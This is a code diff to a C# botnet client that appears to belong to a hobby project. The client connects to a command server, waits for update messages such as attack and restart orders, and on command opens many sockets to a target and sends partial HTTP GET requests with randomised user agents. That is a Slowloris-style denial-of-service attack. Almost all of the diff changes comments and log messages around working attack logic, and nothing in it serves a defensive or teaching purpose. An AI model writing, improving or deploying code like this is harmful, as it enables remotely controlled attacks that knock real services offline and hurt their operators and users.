@@ -83,14 +83,13 @@ namespace BotnetClient
         /// </summary>
         public void clientSocketThread()
         {
-            // Variables to manage the status of the server
+            // Variables to manage the status of the Host-Server
             Boolean run = true;
             Boolean stayConnected = true;
             while (run)
             {
                 try
                 {
-                    log("Establishing connection with host server...");
                     // Establish the remote endpoint for the socket. This example uses port 11111 on the local computer. 
                     IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                     IPAddress ipAddr;
@@ -107,26 +106,25 @@ namespace BotnetClient
                     IPEndPoint localEndPoint = new IPEndPoint(ipAddr, serverPort);
                     // Creation TCP/IP Socket using Socket Class Costructor 
                     socket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
-                    log("Connecting...");
                     try
                     {
                         // Connect Socket to the remote endpoint using method Connect() 
+                        log("Connecting to Host-Server...");
                         socket.Connect(localEndPoint);
-                        // We print EndPoint information that we are connected 
-                        log("Socket connected to -> " + ipAddr.ToString() + ":" + serverPort.ToString());
+                        log("Connected to " + ipAddr.ToString() + ":" + serverPort.ToString());
                         while (stayConnected)
                         {
-                            // Send reponce message to server
+                            // Send reponce message to Host-Server
                             // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE THIS IS WHERE IT WOULD GO
                             if (false)
                             {
                                 string messageToSend = "[Alive: true], [RunningAttack: true]<EOF>";
                                 byte[] messageSent = Encoding.ASCII.GetBytes(messageToSend);
-                                log("Responce: " + messageToSend);
+                                log("Sending Message '" + messageToSend + "'...");
                                 int byteSent = socket.Send(messageSent);
                             }
 
-                            // Recieve updates from host server
+                            // Recieve Update from Host-Server
                             try
                             {
                                 // Data buffer 
@@ -135,16 +133,18 @@ namespace BotnetClient
                                 int byteRecv = socket.Receive(messageReceived);
                                 // Convert message to string for parsing
                                 string message = Encoding.ASCII.GetString(messageReceived, 0, byteRecv);
-                                // Print update message in raw form (un-parsed)
+                                // Handle message types
                                 if (message.Contains("["))
                                 {
                                     if (message.Contains("ping!"))
                                     {
+                                        // clear ping message if it somehow gets in here (we should probably fix this)
                                         message = message.Replace("ping!", "");
                                     }
+                                    // Print split updates into string array
                                     log("Update: " + message);
-                                    string[] arr1 = message.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
-                                    foreach (string item in arr1)
+                                    string[] updates = message.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
+                                    foreach (string item in updates)
                                     {
                                         try
                                         {
@@ -175,13 +175,15 @@ namespace BotnetClient
                                                 {
                                                     log("Starting attack...");
                                                     for (int i = 0; SockCount > i; i++)
-                                                    {// Create sockets for attack
+                                                    {
+                                                        // Create sockets for attack
                                                         try { InitClient(new TcpClient()); } catch { }
                                                     }
                                                 }
                                             }
                                             else if (item.Contains("Restart"))
                                             {
+                                                // This needs some work... it doesnt directly cause the restart, but rather it triggers a bunch of exceptions and we call restart later again
                                                 restart = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                                 if (restart)
                                                 {
@@ -195,20 +197,13 @@ namespace BotnetClient
                                         }
                                     }
                                 }
-                                else if (message.Contains("ping!"))
-                                {
-                                    log("ping from host recieved...");
-                                } else
+                                else if (!message.Contains("ping!"))
                                 {
                                     stayConnected = false;
                                 }
                                 // Increase updateCounter & sleep thread to improve performance
                                 Thread.Sleep(1000);
-                            } catch (Exception e)
-                            {
-                                log("Error with connection to host...");
-                                stayConnected = false;
-                            }
+                            } catch (Exception e){} // no message recieved
                         }
                         log("Disconnecting...");
                         // Close Socket using the method Close() 
@@ -243,6 +238,7 @@ namespace BotnetClient
                     log(e.ToString());
                     if (restart)
                     {
+                        // we have to also call restart here for some reason
                         log("Restarting...");
                         Application.Restart();
                         Environment.Exit(0);
@@ -288,7 +284,7 @@ namespace BotnetClient
                     File.AppendAllText("log.txt", logMessage + Environment.NewLine);
                 } catch (Exception e)
                 {
-                    log(e.ToString());
+                    Console.WriteLine(e.ToString());
                 }
             }
         }
@@ -321,16 +317,19 @@ namespace BotnetClient
 
 
 
-        // Attack Methods (these need work/tweaking) (tbh im not sure how affective these even are, we might need to re-write this entirely. But in theory they should work)
+        // Attack Method (this need work/tweaking/overhaul)
         public void InitClient(TcpClient c)
-        {
-            byte[] GET = Encoding.UTF8.GetBytes($"GET /?{Rand.Next(2000)} HTTP/1.1\r\n"); // GET request to random nonexistent location
-            byte[] UserAgent = Encoding.UTF8.GetBytes($"User-Agent: {UserAgents[Rand.Next(UserAgents.Length)]}"); // Random user agent
+        { 
+            // GET request to random nonexistent location
+            byte[] GET = Encoding.UTF8.GetBytes($"GET /?{Rand.Next(2000)} HTTP/1.1\r\n");
+            // Random user agent
+            byte[] UserAgent = Encoding.UTF8.GetBytes($"User-Agent: {UserAgents[Rand.Next(UserAgents.Length)]}"); 
             byte[] AcceptLanguage = Encoding.UTF8.GetBytes("Accept-Language: en-US,en,q=0.5");
             try
             {
                 IPHostEntry hostInfo = Dns.Resolve(HostOrIP.Trim());
-                c.Connect(hostInfo.AddressList.Where(x => x.AddressFamily == AddressFamily.InterNetwork).First(), Port); // Resolve hostname and connect
+                // Resolve hostname and connect
+                c.Connect(hostInfo.AddressList.Where(x => x.AddressFamily == AddressFamily.InterNetwork).First(), Port); 
                 if (UseSsl)
                 {
                     SocketSafe(c, () =>
@@ -366,7 +365,6 @@ namespace BotnetClient
 
                         log($"Initiating socket ({c.Client.LocalEndPoint})");
                         NetworkStream s = c.GetStream();
-                        int packetSize = 32;
                         s.Write(GET, 0, GET.Length);
                         s.Write(UserAgent, 0, UserAgent.Length);
                         s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
